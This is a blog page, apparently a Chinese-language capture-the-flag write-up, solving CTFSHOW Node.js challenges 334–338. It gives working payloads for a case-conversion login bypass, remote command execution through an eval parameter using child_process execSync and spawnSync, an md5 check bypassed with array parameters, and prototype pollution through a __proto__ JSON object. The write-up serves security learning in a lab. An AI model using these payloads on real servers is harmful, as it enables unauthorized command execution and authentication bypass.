@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>the0n3 - CTFSHOW nodejs 334-338</title>
+        <meta name="description" content="the0n3">
+            <link rel="canonical" href="https://blog.the0n3.top">
+        <script>
+        (function () {
+            try {
+                var key = 'theme';
+                var saved = localStorage.getItem(key);
+                var theme = (saved === 'dark' || saved === 'light') ? saved : 'light';
+                document.documentElement.setAttribute('data-theme', theme);
+                document.documentElement.style.colorScheme = theme;
+            } catch (e) {
+                document.documentElement.setAttribute('data-theme', 'light');
+                document.documentElement.style.colorScheme = 'light';
+            }
+        })();
+    </script>
+    <!-- 使用 GitHub Markdown 样式 -->
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/site.css">
+            <link rel="stylesheet" href="/assets/css/reading-progress.css">
+            <link rel="stylesheet" href="/assets/css/image-enhance.css">
+        <link rel="stylesheet" href="/assets/css/nav-reveal.css">
+    <!-- 代码高亮样式 -->
+    <link rel="stylesheet" href="/assets/prism/prism.css">
+</head>
+<body>
+        <div class="reading-progress" aria-hidden="true">
+        <div class="reading-progress__bar"></div>
+    </div>
+        <header>
+        <nav>
+            <div class="nav-right">
+                <a href="/">首页</a>
+                <a href="/archives">归档</a>
+                <a href="/categories">分类</a>
+                <a href="/tags">标签</a>
+            </div>
+        </nav>
+    </header>
+                <div class="page-layout">
+            <main class="markdown-body">
+                
+<article class="post-content">
+    <h1>CTFSHOW nodejs 334-338</h1>
+    <p>
+        <span class="meta">发布于: 2024-08-06 00:36</span>
+    </p>
+    <div class="post-body">
+        <p>nodejs是跨平台的 JavaScript 后端语言，用于开发服务器端应用程序。它能够执行文件读取、数据库查询等服务器端操作</p>
+<p>参考文章</p>
+<p><a href="https://blog.csdn.net/Yb_140/article/details/124510337">CTFSHOW-nodejs</a>
+<a href="https://nodejs.cn/api/">node官方文档</a>
+<a href="https://nodejs.cn/api/child_process.html#child-process">node官方文档--子进程</a></p>
+<h2>web 334 审计</h2>
+<p>下载文件添加zip扩展名，解压得到两个js文件</p>
+<p>user.js里存储了用户名，密码</p>
+<p><img src="/images/show-nodejs/1.png" alt="user" /></p>
+<p>login.js里存放了登录的操作过程</p>
+<pre><code class="language-js">return name!=='CTFSHOW' &amp;&amp; item.username === name.toUpperCase() &amp;&amp; item.password === password;</code></pre>
+<p>关键语句，登录的用户名不能等于“CTFSHOW”,登录用户名的大写等于存放的用户名“CTFSHOW”，密码等于存放的密码“123456”</p>
+<p>所以，name=ctfshow，pwd=123456</p>
+<h2>web 335 命令执行</h2>
+<p>查看源码，?eval，提示get传参执行命令，类似php的eval函数</p>
+<p><img src="/images/show-nodejs/2.png" alt="exec" /></p>
+<p>看了这个文档，带exec的应该都能直接执行命令吧(稍加思考)</p>
+<pre><code># payload1，成功
+?eval=require("child_process").execSync("ls;tac fl00g.txt");
+# payload2，失败
+?eval=require("child_process").exec("ls");</code></pre>
+<p>execSync可以执行，exec不能直接执行命令的原因，execSync 是同步函数，它可以直接在 require 语句后调用，并立即返回执行结果，可以直接在一行代码中调用它来执行命令并获取输出。那么同进程的其他命令执行函数也是如此？</p>
+<h2>web 336 命令执行</h2>
+<p>上一题payload打不通了。换个函数，spawnSync()，不要直接像上一题一样写一大坨命令例如：</p>
+<pre><code>spawnSync("ls;tac flag.txt")</code></pre>
+<p>在这函数规定了似乎不允许</p>
+<p><img src="/images/show-nodejs/3.png" alt="spawnSync" /></p>
+<p>这个函数执行不能直接输出到页面，用stdout,toString()方法打印出
+来</p>
+<pre><code>?eval=require("child_process").spawnSync("tac",['fl001g.txt']).stdout.toString();</code></pre>
+<h2>web 337</h2>
+<p>关键代码，接受参数a，b。类似php的一个md5比较，数组绕过</p>
+<pre><code class="language-js">var a = req.query.a;
+var b = req.query.b;
+if(a &amp;&amp; b &amp;&amp; a.length===b.length &amp;&amp; a!==b &amp;&amp; md5(a+flag)===md5(b+flag)){
+    res.end(flag);
+}</code></pre>
+<p>url?a[]=1&amp;b[]=1</p>
+<h2>web 338 原型链污染</h2>
+<p>查看routes目录下login.js源码</p>
+<p><img src="/images/show-nodejs/4.png" alt="login" /></p>
+<p>补充：javascript中，<strong>所有对象都继承自一个原型对象，原型对象增加新的属性时，其他对象都会继承</strong></p>
+<pre><code class="language-js">const user = {name:"cola"}
+const tool = {tools:"Google"}
+Object.prototype.lang = "Python"
+console.log(tool.lang)
+//现在，打印结果出现了tool对象不存在的属性lang，从原型对象那里继承得来
+//Python</code></pre>
+<p>代码会通过copy函数，把请求的内容赋值给user对象，如果我们给<strong>proto</strong>原型对象添加一个新的属性来影响原型对象的属性继承，那么就可以达到secert对象的属性ctfshow='36dboy'的条件</p>
+<p><img src="/images/show-nodejs/6.png" alt="api" /></p>
+<p>查看源码，登录接口需要传json数据</p>
+<p>那这里就可以传一个json对象，{"<strong>proto</strong>":{"ctfshow":"36dboy"}}，这样就让secert继承到ctfshow=36dboy的属性</p>    </div>
+        <div class="post-meta-footer">
+                    <span class="post-meta-item">分类:
+                                    <span>wp</span>
+                            </span>
+                            <span class="post-meta-item">标签:
+                                    <span>#nodejs</span>
+                                    <span>#ctfshow</span>
+                                    <span>#wp</span>
+                                    <span>#ctf</span>
+                            </span>
+            </div>
+    </article>
+
+            </main>
+                <aside class="post-toc" aria-label="Table of contents">
+        <div class="toc-title">目录</div>
+        <nav class="toc-list"></nav>
+    </aside>
+            </div>
+        <button id="backToTop" class="fab fab-top" type="button" aria-label="返回顶部" title="返回顶部">↑</button>
+    <button id="themeToggle" class="theme-toggle" type="button" aria-label="切换主题" title="切换主题"></button>
+    <script src="/assets/js/site.js"></script>
+        <script src="/assets/js/navReveal.js"></script>
+        <script src="/assets/js/readingProgress.js"></script>
+            <script src="/assets/js/imageEnhance.js"></script>
+        <!-- 启动代码高亮及行号显示 -->
+    <script src="/assets/prism/prism.js"></script>
+    <script src="/assets/prism/prism-line-number.js"></script>
+    <!-- 主题切换 -->
+    <script src="/assets/js/ThemeSwitch.js"></script>
+</body>
+</html>
